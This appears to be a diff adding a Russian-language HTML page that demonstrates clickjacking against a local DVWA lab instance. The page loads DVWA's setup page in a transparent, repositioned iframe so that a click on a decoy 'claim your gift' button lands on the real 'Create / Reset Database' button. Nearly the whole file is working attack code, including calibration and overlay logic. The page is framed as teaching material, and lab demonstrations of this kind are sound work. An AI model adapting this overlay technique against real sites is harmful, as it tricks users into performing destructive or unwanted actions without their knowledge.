@@ -1,0 +1,116 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Демонстрация clickjacking на DVWA</title>
+  <style>
+    * { box-sizing: border-box; }
+    body { margin: 24px; color: #172554; background: #f1f5f9; font: 16px/1.5 system-ui, sans-serif; }
+    header { max-width: 1000px; }
+    button { margin: 4px 8px 4px 0; padding: 9px 14px; cursor: pointer; }
+    button:disabled { cursor: default; }
+    #status { padding: 12px; background: #dbeafe; }
+    #card { margin-top: 24px; }
+    #offer { display: none; }
+    #viewport { position: relative; width: 1000px; height: 2400px; overflow: hidden; outline: 2px solid #2563eb; }
+    iframe { position: absolute; top: 0; left: 0; width: 1000px; height: 2400px; border: 0; background: white; }
+    #shield { position: absolute; inset: 0; z-index: 2; cursor: default; }
+    #bait { display: none; }
+    body.demo #card { width: 440px; max-width: 100%; padding: 40px; text-align: center; border-radius: 20px; background: white; box-shadow: 0 12px 40px #17255418; }
+    body.demo #offer { display: block; }
+    body.demo #viewport { width: 160px; height: 26px; margin: 24px auto 0; outline: none; border-radius: 5px; }
+    body.demo #bait { display: grid; place-items: center; position: absolute; inset: 0; background: #2563eb; color: white; font-size: 14px; font-weight: 600; }
+    body.demo iframe { opacity: 0; z-index: 1; }
+    body.demo.debug iframe { opacity: 0.55; }
+    body.demo #shield, body.result #shield { display: none; }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Clickjacking: подмена видимого интерфейса</h1>
+    <p>Учебная демонстрация для локального DVWA.
+      В режиме подмены клик по «Забрать подарок» попадёт на настоящую кнопку
+      <strong>Create / Reset Database и сбросит учебную базу</strong>.</p>
+    <p>Внешняя страница: <code id="origin"></code>.
+      Цель: <code>http://127.0.0.1:4280/setup.php</code>.</p>
+    <button id="calibrate" type="button">1. Настроить совмещение</button>
+    <button id="demo" type="button" disabled>2. Показать подмену</button>
+    <button id="result" type="button">3. Показать DVWA / результат</button>
+    <label><input id="debug" type="checkbox"> Просвечивать iframe</label>
+    <p id="status" role="status">Дождись загрузки DVWA, прокрути страницу вниз и нажми
+      точно в центр Create / Reset Database. В режиме настройки клик перехватывается:
+      он только выбирает координаты и не отправляет форму.</p>
+  </header>
+  <main id="card">
+    <div id="offer"><h2>Подарок уже ждёт 🎁</h2><p>Нажми на кнопку, чтобы забрать бонус.</p></div>
+    <div id="viewport">
+      <span id="bait" aria-hidden="true">Забрать подарок</span>
+      <iframe id="target" src="http://127.0.0.1:4280/setup.php" title="Страница настройки DVWA" tabindex="-1"></iframe>
+      <div id="shield" title="Выбери центр кнопки сброса; этот клик не отправит форму"></div>
+    </div>
+  </main>
+  <script>
+    const frame = document.getElementById('target');
+    const viewport = document.getElementById('viewport');
+    const shield = document.getElementById('shield');
+    const status = document.getElementById('status');
+    const demo = document.getElementById('demo');
+    const debug = document.getElementById('debug');
+    let point = null;
+    let mode = 'calibrate';
+    document.getElementById('origin').textContent = location.origin;
+
+    function showFullPage(nextMode) {
+      mode = nextMode;
+      document.body.className = nextMode === 'result' ? 'result' : '';
+      frame.style.left = '0px';
+      frame.style.top = '0px';
+      window.scrollTo(0, 0);
+    }
+
+    shield.addEventListener('click', (event) => {
+      const bounds = viewport.getBoundingClientRect();
+      point = { x: event.clientX - bounds.left, y: event.clientY - bounds.top };
+      demo.disabled = false;
+      status.textContent = 'Координаты выбраны; форма не отправлялась. Нажми «2. Показать подмену». Для проверки совмещения включи «Просвечивать iframe». После настройки не меняй масштаб браузера.';
+      window.scrollTo(0, 0);
+    });
+
+    document.getElementById('calibrate').addEventListener('click', () => {
+      showFullPage('calibrate');
+      point = null;
+      demo.disabled = true;
+      status.textContent = 'Прокрути вниз и нажми точно в центр Create / Reset Database. Этот клик только выбирает координаты; форма не отправляется.';
+    });
+
+    demo.addEventListener('click', () => {
+      if (!point) return;
+      mode = 'demo';
+      document.body.className = debug.checked ? 'demo debug' : 'demo';
+      frame.style.left = `${80 - point.x}px`;
+      frame.style.top = `${13 - point.y}px`;
+      status.textContent = 'Подмена включена. Кликни в центр «Забрать подарок»: клик получит кнопка сброса внутри iframe. Затем нажми «3. Показать DVWA / результат» и проверь ответ приложения.';
+      window.scrollTo(0, 0);
+    });
+
+    debug.addEventListener('change', () => {
+      document.body.classList.toggle('debug', mode === 'demo' && debug.checked);
+    });
+
+    document.getElementById('result').addEventListener('click', () => {
+      showFullPage('result');
+      status.textContent = 'Показан текущий документ iframe без перезагрузки. Найди сообщения DVWA о результате операции. Успешная загрузка iframe сама по себе не подтверждает сброс базы.';
+    });
+
+    frame.addEventListener('load', () => {
+      if (mode === 'demo') {
+        demo.disabled = true;
+        point = null;
+        showFullPage('result');
+        status.textContent = 'После включения подмены iframe загрузил документ. Проверь сообщения DVWA ниже: это может быть результат сброса или ошибка. Страница демонстрации не может прочитать ответ другого origin.';
+      }
+    });
+  </script>
+</body>
+</html>
